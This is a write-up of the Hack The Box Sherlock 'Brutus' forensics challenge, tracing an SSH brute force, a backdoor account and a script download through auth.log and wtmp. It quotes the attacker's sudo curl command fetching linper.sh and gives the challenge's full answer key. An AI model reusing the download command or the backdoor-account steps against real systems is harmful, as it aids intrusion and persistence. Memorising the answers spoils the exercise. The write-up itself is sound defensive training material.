# HTB Sherlock — Brutus: SSH Brute-Force & Post-Exploitation Analysis

## Scenario
A Confluence server (`ip-172-31-35-28`) was brute-forced via SSH. Following
initial access, the attacker performed privilege escalation, persistence, and
further command execution, tracked via `auth.log` and `wtmp`.

## Findings — All Confirmed

| # | Question | Answer |
|---|---|---|
| 1 | Attacker's brute-force source IP | `65.2.161.68` |
| 2 | Compromised account username | `root` |
| 3 | UTC timestamp of manual login (from wtmp) | `2024-03-06 06:32:45 UTC` |
| 4 | SSH session number assigned | `37` |
| 5 | Backdoor account created for persistence | `cyberjunkie` |
| 6 | MITRE ATT&CK sub-technique for account-creation persistence | T1136.001 — Create Account: Local Account |
| 7 | Time the attacker's first SSH session ended | `2024-03-06 06:31:40 UTC` |
| 8 | Full sudo command used to download a script | `sudo curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh` |

## Narrative
48 failed SSH logins against `root` from `65.2.161.68` culminated in a
successful brute-force at 06:31:40. That first session (34) closed
instantly — likely a dropped connection — before the attacker reconnected a
minute later, producing session 37 at 06:32:44, the real working session.
From there, the attacker created a sudo-privileged backdoor account
(`cyberjunkie`) for lower-profile persistence, then used it to download
`linper.sh`, a known Linux privilege-escalation enumeration tool, signaling
further privilege-escalation activity was the next planned step.

## Methodology
- `auth.log` searched for `Failed password` entries grouped by source IP to identify the brute-force origin.
- `Accepted password` entries cross-referenced against that IP to confirm the compromised account.
- `wtmp` parsed via a Python utmp-parsing script to recover exact login timestamps not present in `auth.log` alone.
- `useradd`/`usermod` entries in `auth.log` reviewed to identify the persistence account and its privilege escalation.
- `sudo:` entries filtered for `wget`/`curl` to recover the exact download command used post-compromise.
